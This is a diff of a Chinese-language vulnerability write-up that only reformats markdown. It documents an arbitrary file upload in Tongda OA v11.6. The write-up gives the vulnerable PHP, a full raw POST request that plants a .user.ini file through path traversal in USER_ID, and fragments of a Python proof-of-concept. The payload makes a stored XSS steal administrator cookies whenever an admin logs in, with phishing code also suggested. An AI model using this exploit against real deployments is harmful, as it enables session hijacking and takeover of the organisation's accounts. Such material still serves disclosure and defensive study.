@@ -6,7 +6,7 @@
 
 参考阅读：
 
-- https://paper.seebug.org/1499/
+* https://paper.seebug.org/1499/
 
 ## 漏洞影响
 
@@ -24,7 +24,7 @@
 
 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难
 
-出现漏洞的文件为 **webroot/general/hr/manage/staff_info/update.php**
+出现漏洞的文件为 **webroot/general/hr/manage/staff\_info/update.php**
 
 ```php
 <?php
@@ -69,15 +69,15 @@ if ($PHOTO_NAME0 != "") {
 }
 ```
 
-![image-20220209111308741](images/202202091113931.png)
+![image-20220209111308741](../.gitbook/assets/202202091113931.png)
 
-在这里参数 **$USER_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
+在这里参数 **$USER\_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
 
 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 **.user.ini** 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件
 
 内容为
 
-```plain
+```
 auto_prepend_file=test.log
 ```
 
@@ -87,7 +87,7 @@ auto_prepend_file=test.log
 
 请求包为
 
-```plain
+```
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1
 Host: 192.168.1.105
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -112,9 +112,9 @@ Content-Disposition: form-data; name="submit"
 -----------------------------17518323986548992951984057104--
 ```
 
-其中 **USER_ID=../../general/.user** 为上传路径
+其中 **USER\_ID=../../general/.user** 为上传路径
 
-```plain
+```
 Content-Disposition: form-data; name="ATTACHMENT"; filename="peiqi.ini"
 Content-Type: text/plain
 
@@ -123,21 +123,21 @@ auto_prepend_file=peiqi.log
 
 这里拼接后上传就变成了 **.user.ini**
 
-![image-20220209111339894](images/202202091113999.png)
+![image-20220209111339894](../.gitbook/assets/202202091113999.png)
 
 这里再上传 XSS文件 **peiqi.log** 被包含进去
 
-![image-20220209111358294](images/202202091113385.png)
+![image-20220209111358294](../.gitbook/assets/202202091113385.png)
 
 上传后每次管理员登录后都会带着Cookie请求一次XSS平台
 
-![image-20220209111423483](images/202202091114571.png)
+![image-20220209111423483](../.gitbook/assets/202202091114571.png)
 
 钓鱼什么的代码写在peiqi.log文件里就好啦
 
 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径
 
-![image-20220209111524536](images/202202091115646.png)
+![image-20220209111524536](../.gitbook/assets/202202091115646.png)
 
 ```php
 if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {
@@ -148,13 +148,13 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 	}
 ```
 
-路径中必须要包含  **webroot 和 attachment** 才可以上传
+路径中必须要包含 **webroot 和 attachment** 才可以上传
 
-![image-20220209111502133](images/202202091115242.png)
+![image-20220209111502133](../.gitbook/assets/202202091115242.png)
 
 这里XSS的利用点有4个文件夹，其中最有几率XSS的为**存储目录管理的文件夹**
 
-![image-20220209111547012](images/202202091115069.png)
+![image-20220209111547012](../.gitbook/assets/202202091115069.png)
 
 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie
 
@@ -162,11 +162,11 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 
 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞
 
-Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句
+Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi\_Wiki为 自己的XSS语句
 
 v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好
 
-v11.6以上 攻击  /general/system/attachment 目录较好
+v11.6以上 攻击 /general/system/attachment 目录较好
 
 ```python
 import requests
@@ -264,5 +264,4 @@ if __name__ == '__main__':
     POC_1(target_url, Cookie)
 ```
 
-![image-20220209111615822](images/202202091116959.png)
-
+![image-20220209111615822](../.gitbook/assets/202202091116959.png)
